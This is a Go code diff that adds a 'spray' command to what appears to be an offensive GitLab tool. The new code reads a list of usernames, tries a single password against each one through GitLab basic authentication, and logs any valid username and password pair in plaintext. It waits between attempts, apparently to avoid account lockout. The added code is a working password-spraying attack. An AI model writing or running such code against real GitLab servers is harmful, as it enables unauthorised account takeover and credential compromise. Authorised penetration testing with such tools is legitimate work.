@@ -1,6 +1,7 @@
 package cmd
 
 import (
+	"bufio"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -18,6 +19,7 @@ import (
 var (
 	GL                     GitlabClient
 	GITLAB_USERNAME        string
+	GITLAB_USERLIST        string
 	GITLAB_PASSWORD        string
 	GITLAB_SERVER          string
 	GITLAB_TOKEN           string
@@ -28,6 +30,7 @@ var (
 	GITLAB_OUTPUTS         string
 	GITLAB_VARIABLES       string
 	GITLAB_LATEST_JOB      bool
+	GITLAB_SPRAY_TIMEOUT   int
 )
 
 type GitlabClient struct {
@@ -431,6 +434,56 @@ func (g *GitlabClient) OutputWorker(projects chan *gitlab.Project, wg *sync.Wait
 	return nil
 }
 
+func GitlabSpray() error {
+	userlist, err := os.Open(GITLAB_USERLIST)
+	if err != nil {
+		return fmt.Errorf("error opening username list - err: %v", err)
+	}
+	defer userlist.Close()
+
+	scanner := bufio.NewScanner(userlist)
+	for scanner.Scan() {
+		username := scanner.Text()
+
+		custom_client, err := NewHttpClient()
+		if err != nil {
+			log.Errorf("error creating http client - err: %v", err)
+			continue
+		}
+
+		opts := gitlab.WithHTTPClient(custom_client)
+
+		git, err := gitlab.NewBasicAuthClient(username, GITLAB_PASSWORD, gitlab.WithBaseURL(GITLAB_SERVER), opts)
+		if err != nil {
+			log.Errorf("error creating basic auth client - err: %v", err)
+			continue
+		}
+
+		user, _, err := git.Users.CurrentUser()
+		if err != nil {
+			log.Errorf("[Gitlab] unsuccessful login - username: %s - password: %s", username, GITLAB_PASSWORD)
+		} else {
+			log.Printf("[Gitlab] VALID CREDENTIAL - username: %s - password: %s", user.Username, GITLAB_PASSWORD)
+		}
+
+		time.Sleep(time.Duration(GITLAB_SPRAY_TIMEOUT) * time.Second)
+	}
+
+	return nil
+}
+
+var gitlabSprayCmd = &cobra.Command{
+	Use:   "spray",
+	Short: "Password Spray",
+	Long:  `Password Spray`,
+
+	Run: func(cmd *cobra.Command, args []string) {
+		if err := GitlabSpray(); err != nil {
+			log.Fatal(err)
+		}
+	},
+}
+
 var gitlabGetOutputsCmd = &cobra.Command{
 	Use:    "get-outputs",
 	Short:  "Get Outputs from CI/CD Jobs",
@@ -552,6 +605,7 @@ func init() {
 	gitlabCmd.AddCommand(gitlabCreateTokenCmd)
 	gitlabCmd.AddCommand(gitlabWhoamiCmd)
 	gitlabCmd.AddCommand(gitlabGetOutputsCmd)
+	gitlabCmd.AddCommand(gitlabSprayCmd)
 
 	gitlabCmd.PersistentFlags().StringVarP(&GITLAB_SERVER, "server", "s", "", "Server Address")
 	gitlabCmd.PersistentFlags().StringVarP(&GITLAB_USERNAME, "user", "u", "", "Username")
@@ -563,6 +617,9 @@ func init() {
 	gitlabCreateTokenCmd.Flags().IntVarP(&GITLAB_TOKEN_USER_ID, "id", "i", 0, "User ID")
 
 	gitlabGetOutputsCmd.Flags().BoolVarP(&GITLAB_LATEST_JOB, "latest", "l", false, "Get output from latest job")
+
+	gitlabSprayCmd.Flags().StringVarP(&GITLAB_USERLIST, "userlist", "x", "", "Userlist path")
+	gitlabSprayCmd.Flags().IntVarP(&GITLAB_SPRAY_TIMEOUT, "timeout", "n", 5, "Timeout between login attempts (seconds)")
 
 	var err error
 
